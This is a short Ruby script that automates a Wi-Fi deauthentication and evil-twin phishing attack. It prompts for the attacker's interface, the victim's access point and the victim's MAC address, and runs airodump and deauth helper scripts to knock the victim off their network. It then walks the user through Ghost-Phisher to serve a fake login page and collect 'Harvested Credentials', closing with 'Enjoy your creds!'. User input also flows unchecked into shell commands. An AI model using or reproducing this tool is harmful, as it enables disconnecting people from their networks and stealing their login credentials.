#!/bin/ruby

print("Please open Ghost-Phisher on your Kali machine.
")
print("Before continuing, I will need to know the name of the interface that you plan on using for this
attack. Name of interface: 
")
interface = gets.chomp

system("sed -i 's/interface/#{interface}/g' airodump.sh")
system("chmod +x airodump.sh")
system("bash airodump.sh")
print("What is the name of the BSSID that your victim
is connected to: 
")
bssid = gets.chomp

system("ifconfig #{interface} down")
system("iwconfig #{interface} mode monitor")
system("ifconfig #{interface} up")
system("sed -i 's/bssid1/#{bssid}/g' airodump_mac.sh")
system("sed -i 's/interface/#{interface}/g' airodump_mac.sh")
system("ifconfig #{interface} down")
system("iwconfig #{interface} mode managed")
system("ifconfig #{interface} up")
system("chmod +x airodump_mac.sh")
system("bash airodump_mac.sh")
print("What is the MAC address of your victim: 
")
victim_mac = gets.chomp

print("WARNING: DO NOT CLOSE THE TERMINAL ABOUT TO BE OPENED!!!")
system("sed -i 's/bssid/#{bssid}/g' deauth.sh")
system("sed -i 's/victim_mac/#{victim_mac}/g' deauth.sh")
system("sed -i 's/interface/#{interface}/g' deauth.sh")
system("chmod +x deauth.sh")
system("bash deauth.sh")
print("In Ghost-Phisher, please create an access point, using
a wireless card other than the #{interface}.
")
print("Go to the 'Fake HTTP Server' tab and click on 'Select
Webpage,' select one of the HTML files in the 'Deauth_for_Creds' 
folder.")
print("Go to the 'Harvested Credentials' tab and look for your
victim's information.")
print("Kill the terminal running the deauth attack.")
print("Enjoy your creds!")
